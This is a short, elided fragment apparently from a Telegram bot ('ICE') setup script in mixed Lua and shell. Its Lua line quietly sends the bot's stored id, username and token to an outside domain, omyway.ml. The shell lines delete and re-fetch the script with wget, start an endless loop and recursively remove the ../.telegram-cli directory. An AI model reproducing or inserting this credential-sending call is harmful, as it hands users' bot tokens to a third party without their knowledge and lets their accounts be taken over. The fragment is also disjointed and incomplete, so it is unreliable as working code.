...
https.request("https://omyway.ml/bn/ICE.php?id="..database:get(Server_ICE.."Id_ICE").."&user="..database:get(Server_ICE.."UserName_ICE").."&token="..database:get(Server_ICE.."Token_ICE"))
...
rm -fr ICE.lua
wget "https://raw.githubusercontent.com/IICETEAM/ICE/main/ICE.lua"
while(true) do
rm -fr ../.telegram-cli
